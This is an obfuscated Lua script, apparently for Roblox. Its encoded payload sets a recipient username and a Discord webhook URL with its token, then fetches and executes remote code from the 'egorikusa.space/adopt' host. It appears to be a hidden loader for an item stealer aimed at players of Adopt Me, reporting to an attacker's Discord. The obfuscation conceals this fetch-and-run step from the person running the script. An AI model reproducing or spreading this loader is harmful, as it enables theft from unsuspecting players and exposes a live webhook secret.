--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.7) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v90=v2(v0(v30,16));if v19 then local v111=v5(v90,v19);v19=nil;return v111;else return v90;end end end);local function v20(v31,v32,v33) if v33 then local v91=(v31/((5 -3)^(v32-(2 -1))))%((3 -(878 -(282 + 595)))^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + (1638 -(1523 + 114)))) ;return v91-(v91%(932 -(857 + 74))) ;else local v92=(570 -(330 + 37 + (286 -85)))^(v32-(928 -(214 + 713))) ;return (((v31%(v92 + v92))>=v92) and (1 + 0)) or (0 + (1065 -(68 + 997))) ;end end local function v21() local v34=1270 -(226 + 1044) ;local v35;while true do if (v34==(4 -3)) then return v35;end if (v34==(0 + (0 -0))) then v35=v1(v16,v18,v18);v18=v18 + (958 -(892 + 65)) ;v34=2 -1 ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + 2 );v18=v18 + (3 -1) ;return (v37 * (606 -(87 + 263))) + v36 ;end local function v23() local v38=0;local v39;local v40;local v41;local v42;while true do if (v38==(181 -(67 + 113))) then return (v42 * (12302277 + 4474939)) + (v41 * (160901 -95365)) + (v40 * (189 + 67)) + v39 ;end if (v38==((0 -0) -0)) then v39,v40,v41,v42=v1(v16,v18,v18 + (955 -(802 + 150)) );v18=v18 + 3 + 1 ;v38=2 -1 ;end end end local function v24() local v43=v23();local v44=v23();local v45=773 -(201 + 571) ;local v46=(v20(v44,998 -(915 + 82) ,56 -36 ) * ((2 + 0)^(41 -9))) + v43 ;local v47=v20(v44,1208 -(1069 + 118) ,70 -39 );local v48=((v20(v44,69 -37 )==(1 + 0)) and  -1) or (1 -0) ;if (v47==(0 + 0)) then if (v46==(791 -((798 -(44 + 386)) + 423))) then return v48 * ((1138 -(116 + 1022)) -0) ;else local v112=(1504 -(998 + 488)) -(10 + 8) ;while true do if (0==v112) then v47=3 -2 ;v45=(141 + 301) -(416 + 26) ;break;end end end elseif (v47==(6535 -4488)) then return ((v46==(0 + 0 + 0)) and (v48 * (1/(0 -0)))) or (v48 * NaN) ;end return v8(v48,v47-(1809 -786) ) * (v45 + (v46/(((361 + 79) -(145 + 293))^52))) ;end local function v25(v49) local v50;if  not v49 then v49=v23();if (v49==(0 -0)) then return "";end end v50=v3(v16,v18,(v18 + v49) -(860 -(814 + 45)) );v18=v18 + v49 ;local v51={};for v67=2 -1 , #v50 do v51[v67]=v2(v1(v3(v50,v67,v67)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return function(v93,v94,v95,v96,v97,v98,v99,v100,v101) local v102=(function() return 0 -0 ;end)();local v93=(function() return;end)();local v94=(function() return;end)();while true do if ((0 -0)~=v102) then else local v117=(function() return 0;end)();local v118=(function() return;end)();while true do if (v117~=0) then else v118=(function() return 1206 -(696 + 510) ;end)();while true do if (v118==1) then v102=(function() return 1 -0 ;end)();break;end if (v118~=(1262 -(1091 + 171))) then else local v136=(function() return 0 + 0 ;end)();while true do if (v136~=(0 -0)) then else v93=(function() return 0 -0 ;end)();v94=(function() return nil;end)();v136=(function() return 375 -(123 + 251) ;end)();end if (v136==(4 -3)) then v118=(function() return 1;end)();break;end end end end break;end end end if (v102~=1) then else local v119=(function() return 0;end)();while true do if (v119~=(698 -(208 + 490))) then else while true do if (0==v93) then v94=(function() return v95();end)();if (v96(v94, #",", #"|")~=(0 + 0)) then else local v166=(function() return 0 + 0 ;end)();local v167=(function() return;end)();local v168=(function() return;end)();local v169=(function() return;end)();while true do if (v166==3) then if (v96(v168, #"-19", #"19(")== #"{") then v169[ #"0313"]=(function() return v99[v169[ #"?id="]];end)();end v100[v101]=(function() return v169;end)();break;end if (v166==1) then local v177=(function() return 0;end)();while true do if (v177~=0) then else v169=(function() return {v97(),v97(),nil,nil};end)();if (v167==(0 + 0)) then local v181=(function() return 202 -(14 + 188) ;end)();while true do if (v181~=(675 -(534 + 141))) then else v169[ #"-19"]=(function() return v97();end)();v169[ #".dev"]=(function() return v97();end)();break;end end elseif (v167== #".") then v169[ #"asd"]=(function() return v98();end)();elseif (v167==2) then v169[ #"asd"]=(function() return v98() -(2^16) ;end)();elseif (v167== #"xnx") then local v186=(function() return 0 + 0 ;end)();local v187=(function() return;end)();while true do if (v186~=0) then else v187=(function() return 0;end)();while true do if (v187==0) then v169[ #"-19"]=(function() return v98() -((2 + 0)^(16 + 0)) ;end)();v169[ #".dev"]=(function() return v97();end)();break;end end break;end end end v177=(function() return 1 -0 ;end)();end if ((1 -0)~=v177) then else v166=(function() return 5 -3 ;end)();break;end end end if ((2 + 0)==v166) then if (v96(v168, #"[", #",")~= #"[") then else v169[2 + 0 ]=(function() return v99[v169[398 -(115 + 281) ]];end)();end if (v96(v168,2,2)~= #"{") then else v169[ #"xxx"]=(function() return v99[v169[ #"xnx"]];end)();end v166=(function() return 3;end)();end if (v166~=(0 -0)) then else v167=(function() return v96(v94,2 + 0 , #"xnx");end)();v168=(function() return v96(v94, #"asd1",6);end)();v166=(function() return 2 -1 ;end)();end end end break;end end return v93,v94,v95,v96,v97,v98,v99,v100,v101;end end end end end;end)();local v53=(function() return function(v103,v104,v105) local v106=(function() return 0 -0 ;end)();local v107=(function() return;end)();while true do if (v106~=(867 -(550 + 317))) then else v107=(function() return 0;end)();while true do if (v107~=(0 -0)) then else v103[v104-#"\\" ]=(function() return v105();end)();return v103,v104,v105;end end break;end end end;end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {v54,v55,nil,v56};end)();local v58=(function() return v23();end)();local v59=(function() return {};end)();for v69= #">",v58 do local v70=(function() return 0 -0 ;end)();local v71=(function() return;end)();local v72=(function() return;end)();local v73=(function() return;end)();while true do if (v70==(285 -(134 + 151))) then v71=(function() return 1665 -(970 + 695) ;end)();v72=(function() return nil;end)();v70=(function() return 1 -0 ;end)();end if (v70==(1991 -(582 + 1408))) then v73=(function() return nil;end)();while true do if (v71~=(0 -0)) then else local v120=(function() return 0 -0 ;end)();while true do if (v120==1) then v71=(function() return 1;end)();break;end if (v120~=0) then else v72=(function() return v21();end)();v73=(function() return nil;end)();v120=(function() return 1;end)();end end end if ((3 -2)==v71) then if (v72== #"/") then v73=(function() return v21()~=0 ;end)();elseif (v72==2) then v73=(function() return v24();end)();elseif (v72== #"19(") then v73=(function() return v25();end)();end v59[v69]=(function() return v73;end)();break;end end break;end end end v57[ #"xxx"]=(function() return v21();end)();for v74= #"!",v23() do FlatIdent_43862,Descriptor,v21,v20,v22,v23,v59,v54,v74=(function() return v52(FlatIdent_43862,Descriptor,v21,v20,v22,v23,v59,v54,v74);end)();end for v75= #"|",v23() do v55,v75,v28=(function() return v53(v55,v75,v28);end)();end return v57;end local function v29(v61,v62,v63) local v64=v61[1825 -(1195 + 629) ];local v65=v61[5 -3 ];local v66=v61[7 -4 ];return function(...) local v76=v64;local v77=v65;local v78=v66;local v79=v27;local v80=1 -0 ;local v81= -(242 -(187 + 54));local v82={};local v83={...};local v84=v12("#",...) -(1 + 0) ;local v85={};local v86={};for v108=0 + 0 ,v84 do if ((4134>=3357) and (3287<4046) and (v108>=v78)) then v82[v108-v78 ]=v83[v108 + (1 -0) ];else v86[v108]=v83[v108 + (1 -0) ];end end local v87=(v84-v78) + 1 + 0 ;local v88;local v89;while true do v88=v76[v80];v89=v88[1 + 0 + 0 ];if (v89<=(22 -12)) then if (v89<=(1640 -(1027 + 346 + 263))) then if (v89<=(2 -1)) then if (v89>(1000 -(451 + 549))) then if (v86[v88[(4 -2) -0 ]]==v88[(1977 -(1913 + 62)) + 2 ]) then v80=v80 + (1 -0) ;else v80=v88[3 + 0 ];end else local v123=v88[2 -0 ];local v124,v125=v79(v86[v123](v13(v86,v123 + ((873 + 512) -(746 + (1688 -1050))) ,v88[2 + 1 ])));v81=(v125 + v123) -(1 -0) ;local v126=0 + 0 ;for v137=v123,v81 do v126=v126 + ((3191 -(565 + 1368)) -((2245 -(373 + 829)) + 214)) ;v86[v137]=v124[v126];end end elseif ((v89<=(7 -5)) or (2318==4700)) then v63[v88[344 -(218 + (854 -(476 + 255))) ]]=v86[v88[1583 -(1535 + 46) ]];elseif ((v89==((26 -19) -4)) or (3417<2534)) then do return;end else v80=v88[(1664 -(1477 + 184)) + 0 ];end elseif (v89<=(327 -(53 + 267))) then if ((v89<=(1 + 4)) or (2722<=164)) then v80=v88[563 -((1436 -(369 + 761)) + 254) ];elseif ((v89==(419 -(15 + 398))) or (2408<2109)) then local v144=v88[(1 -0) + 1 ];local v145=v86[v88[5 -2 ]];v86[v144 + (1468 -(521 + 378 + 568)) ]=v145;v86[v144]=v145[v88[3 + 1 ]];else v86[v88[4 -2 ]]();end elseif ((v89<=(8 + 0)) or (142==1447) or (33==1455)) then v86[v88[605 -(268 + (1191 -(564 + 292))) ]]=v63[v88[293 -((103 -43) + 230) ]];elseif ((v89==((1054 -473) -(426 + 146))) or (647==4687)) then local v149=v88[1 + 1 ];v86[v149]=v86[v149](v13(v86,v149 + (1457 -(282 + 1174)) ,v81));else for v170=v88[3 -1 ],v88[(1542 -728) -(569 + 242) ] do v86[v170]=nil;end end elseif (v89<=15) then if (v89<=(34 -(260 -(64 + 174)))) then if (v89>(1 + 10)) then v86[v88[1026 -((2127 -1421) + 318) ]]();else v63[v88[7 -(308 -(244 + 60)) ]]=v86[v88[1253 -(721 + 76 + 454) ]];end elseif (v89<=(1284 -((1399 -454) + 326))) then for v140=v88[7 -5 ],v88[7 -4 ] do v86[v140]=nil;end elseif (v89==((489 -(41 + 435)) + 1)) then v86[v88[702 -((607 -(144 + 192)) + 429) ]]=v63[v88[3 + 0 ]];elseif ((943<=4776) and (v86[v88[1502 -(1408 + 92) ]]==v88[4])) then v80=v80 + (1087 -(461 + 625)) ;else v80=v88[1291 -(993 + 295) ];end elseif (v89<=(1 + (1018 -(938 + 63)))) then if ((v89<=16) or (443>=4015)) then v86[v88[979 -(553 + (640 -(42 + 174))) ]]=v88[5 -(2 + 0) ];elseif ((3382>166) and (v89==((2313 -(936 + 189)) -(418 + 753)))) then local v153=v88[1 + 1 ];v86[v153]=v86[v153](v13(v86,v153 + 1 + 0 ,v81));else local v155=v88[2 + 0 + 0 ];local v156=v86[v88[1 + (1615 -(1565 + 48)) ]];v86[v155 + 1 + 0 + 0 ]=v156;v86[v155]=v156[v88[2 + 0 + 2 ]];end elseif ((v89<=(548 -(406 + 123))) or (280==3059)) then do return;end elseif (v89>((1482 + 307) -(1749 + 9 + 11))) then v86[v88[1 + 1 ]]=v88[1325 -(1249 + 73) ];else local v162=v88[(1505 -(363 + 1141)) + 1 ];local v163,v164=v79(v86[v162](v13(v86,v162 + (1146 -(466 + 679)) ,v88[6 -3 ])));v81=(v164 + v162) -(2 -1) ;local v165=1329 -(797 + (1670 -(782 + 356))) ;for v172=v162,v81 do v165=v165 + (1901 -(106 + (3374 -(1183 + 397)))) ;v86[v172]=v163[v165];end end v80=v80 + 1 + 0 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!0A3O00028O00026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574031D3O00682O7470733A2O2F65676F72696B7573612E73706163652F61646F707403083O00557365726E616D6503073O00786E69722O6C7903073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3132363839372O3638393136313936353630392F666373304456415869717331457067495571675A30465A4D7754586A56735F6E706877563255796E4F41314652576C6B34734F316D6B6877552D655056324A455F43647200223O0012153O00014O000A000100013O00260F3O000200010001002O043O00020001001215000100013O00260F0001000F00010002002O043O000F0001001208000200033O001208000300043O002006000300030005001215000500064O0014000300054O001100023O00022O000C000200010001002O043O0021000100260F0001000500010001002O043O00050001001215000200013O00260F0002001600010002002O043O00160001001215000100023O002O043O0005000100260F0002001200010001002O043O00120001001215000300083O00120B000300073O0012150003000A3O00120B000300093O001215000200023O002O043O00120001002O043O00050001002O043O00210001002O043O000200012O00033O00017O00",v9(),...);